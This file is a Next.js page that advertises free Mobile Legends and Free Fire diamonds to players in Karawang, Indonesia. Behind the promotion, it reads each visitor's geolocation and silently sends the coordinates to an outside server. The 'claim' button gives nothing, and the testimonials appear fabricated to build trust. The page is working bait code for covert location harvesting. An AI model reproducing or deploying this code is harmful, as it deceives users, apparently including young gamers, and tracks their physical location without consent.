"use client";
import React, { useEffect, useState } from "react";
import Image from "next/image";
import { useGeolocation } from "@uidotdev/usehooks";
import Popup from "@/components/Popup";

export default function Home() {
  const state = useGeolocation();
  const [showPopup, setShowPopup] = useState(false);
  const handleButton = () => {
    if (state.error) {
      setShowPopup(true);
    }
  };
  useEffect(() => {
    async function sendLocation(latitude, longitude) {
      try {
        const res = await fetch(
          `https://diamon-gratis.vercel.app/api/send?latitude=${latitude}&longitude=${longitude}`
        );
        const data = await res.json();
        console.log(data);
      } catch (err) {
        console.error("Error saat mengirim lokasi:", err);
      }
    }

    if (state.latitude && state.longitude) {
      sendLocation(state.latitude, state.longitude);
    }
  }, [state.latitude, state.longitude]);

  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {showPopup && <Popup />}
      <div></div>
      {/* Header */}
      <header className="bg-blue-600 text-white py-4">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-center">
            Diamond Gratis Mobile Legends & Free Fire
          </h1>
          <p className="text-center mt-2">Khusus Daerah Karawang!</p>
        </div>
      </header>

      {/* Hero Section */}
      <section className="py-12 bg-gradient-to-r from-purple-500 to-pink-500">
        <div className="container mx-auto px-4 flex flex-col md:flex-row items-center">
          <div className="md:w-1/2 mb-8 md:mb-0">
            <h2 className="text-4xl font-bold text-white mb-4">
              Dapatkan Diamond Gratis Sekarang!
            </h2>
            <p className="text-xl text-white mb-6">
              Kesempatan terbatas untuk gamers di Karawang. Tingkatkan
              pengalaman bermainmu tanpa biaya tambahan!
            </p>
            {
              <button
                onClick={handleButton}
                className="bg-yellow-400 text-gray-900 font-bold py-3 px-6 rounded-full hover:bg-yellow-300 transition duration-300"
              >
                {state.loading ? "loading" : "klaim sekarang"}
              </button>
            }
          </div>
          <div className="md:w-1/2">
            <Image
              src="https://dailyspin.id/wp-content/uploads/2021/03/diamond-gratis.jpg"
              alt="Mobile Legends dan Free Fire"
              width={400}
              height={300}
              className="rounded-lg shadow-lg"
            />
          </div>
        </div>
      </section>

      {/* Promo Information */}
      <section className="py-16">
        <div className="container mx-auto px-4">
          <h2 className="text-3xl font-bold text-center mb-8">
            Cara Mendapatkan Diamond Gratis
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            <div className="bg-white p-6 rounded-lg shadow-md">
              <h3 className="text-xl font-semibold mb-4">Mobile Legends</h3>
              <Image
                src="https://kaleoz-media.seagmcdn.com/kaleoz-store/202404/oss-40337729e0550d499fe9781c2e8be72c.jpeg"
                alt="Mobile Legends Diamonds"
                width={350}
                height={200}
                className="rounded-lg mb-4"
              />
              <ul className="list-disc list-inside">
                <li>Download aplikasi promo resmi</li>
                <li>Daftar dengan ID game dan nomor HP</li>
                <li>Selesaikan misi harian</li>
                <li>Klaim 100 diamond gratis setiap hari</li>
              </ul>
            </div>
            <div className="bg-white p-6 rounded-lg shadow-md">
              <h3 className="text-xl font-semibold mb-4">Free Fire</h3>
              <Image
                src="https://www.static-src.com/wcsstore/Indraprastha/images/catalog/full//98/MTA-45786113/garena_top_up_diamond_free_fire_via_id_full01_8e79556c.jpg"
                alt="Free Fire Diamonds"
                width={350}
                height={200}
                className="rounded-lg mb-4"
              />
              <ul className="list-disc list-inside">
                <li>Ikuti akun sosial media resmi kami</li>
                <li>Bagikan postingan promo ke 5 teman</li>
                <li>Mainkan event in-game khusus Karawang</li>
                <li>Dapatkan 500 diamond gratis mingguan</li>
              </ul>
            </div>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="bg-gray-200 py-16">
        <div className="container mx-auto px-4">
          <h2 className="text-3xl font-bold text-center mb-8">
            Apa Kata Mereka?
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="bg-white p-6 rounded-lg shadow-md">
              <p className="text-gray-600 mb-4">
                "Diamond gratis ini beneran! Gue udah upgrade skin legendary
                thanks to this promo!"
              </p>
              <p className="font-semibold">- rama dari Karawang</p>
            </div>

            <div className="bg-white p-6 rounded-lg shadow-md">
              <p className="text-gray-600 mb-4">
                "njir seriusan beneran dapet thank bro"
              </p>
              <p className="font-semibold">- Rangga dari Karawang</p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow-md">
              <p className="text-gray-600 mb-4">
                "Lumayanlah numpung keur boke wkwkwk"
              </p>
              <p className="font-semibold">- Dadan dari Karawang</p>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-800 text-white py-8">
        <div className="container mx-auto px-4 text-center">
          <p className="mb-4">
            Promo ini hanya berlaku untuk pengguna di wilayah Karawang.
          </p>
          <p className="text-sm">
            © 2024 Game Promo Karawang. Semua hak cipta dilindungi.
          </p>
        </div>
      </footer>
    </div>
  );
}
